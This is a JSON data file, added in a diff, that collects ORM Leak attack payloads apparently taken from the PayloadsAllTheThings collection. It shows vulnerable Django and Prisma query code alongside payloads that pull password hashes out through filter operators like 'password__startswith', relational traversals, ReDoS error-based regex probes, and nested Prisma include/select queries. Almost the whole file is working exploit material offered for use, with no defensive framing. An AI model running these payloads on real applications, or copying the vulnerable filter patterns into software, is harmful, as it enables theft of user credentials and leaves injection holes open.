@@ -1,0 +1,115 @@
+{
+  "source": "PayloadsAllTheThings",
+  "exploit_type": "orm_leak",
+  "original_category": "ORM Leak",
+  "payloads": [
+    {
+      "category": "Django (Python)",
+      "escalation": "baseline",
+      "lines": [
+        "users = User.objects.filter(**request.data)",
+        "serializer = UserSerializer(users, many=True)"
+      ]
+    },
+    {
+      "category": "Query filter",
+      "escalation": "baseline",
+      "lines": [
+        "{",
+        "\"username\": \"admin\",",
+        "\"password__startswith\": \"p\"",
+        "}"
+      ]
+    },
+    {
+      "category": "Relational Filtering",
+      "escalation": "baseline",
+      "lines": [
+        "{",
+        "\"created_by__user__password__contains\": \"p\"",
+        "}",
+        "{",
+        "\"created_by__departments__employees__user__username__startswith\": \"p\",",
+        "\"created_by__departments__employees__user__id\": 1",
+        "}"
+      ]
+    },
+    {
+      "category": "Error-based leaking - ReDOS",
+      "escalation": "baseline",
+      "lines": [
+        "{\"created_by__user__password__regex\": \"^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$\"}",
+        "// => Return something",
+        "{\"created_by__user__password__regex\": \"^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$\"}",
+        "// => Error 500 (Timeout exceeded in regular expression match)"
+      ]
+    },
+    {
+      "category": "Prisma (Node.JS)",
+      "escalation": "baseline",
+      "lines": [
+        "const posts = await prisma.article.findMany({",
+        "where: req.query.filter as any // Vulnerable to ORM Leaks",
+        "})",
+        "{",
+        "\"filter\": {",
+        "\"include\": {",
+        "\"createdBy\": true",
+        "}",
+        "}",
+        "}",
+        "{",
+        "\"filter\": {",
+        "\"select\": {",
+        "\"createdBy\": {",
+        "\"select\": {",
+        "\"password\": true",
+        "}",
+        "}",
+        "}",
+        "}",
+        "}"
+      ]
+    },
+    {
+      "category": "Relational Filtering",
+      "escalation": "baseline",
+      "lines": [
+        "{",
+        "\"query\": {",
+        "\"createdBy\": {",
+        "\"departments\": {",
+        "\"some\": {",
+        "\"employees\": {",
+        "\"some\": {",
+        "\"departments\": {",
+        "\"some\": {",
+        "\"employees\": {",
+        "\"some\": {",
+        "\"departments\": {",
+        "\"some\": {",
+        "\"employees\": {",
+        "\"some\": {",
+        "\"{fieldToLeak}\": {",
+        "\"startsWith\": \"{testStartsWith}\"",
+        "}",
+        "}",
+        "}",
+        "}",
+        "}",
+        "}",
+        "}",
+        "}",
+        "}",
+        "}",
+        "}",
+        "}",
+        "}",
+        "}",
+        "}",
+        "}"
+      ]
+    }
+  ],
+  "converted_at": "2026-04-03T07:48:28.873Z"
+}
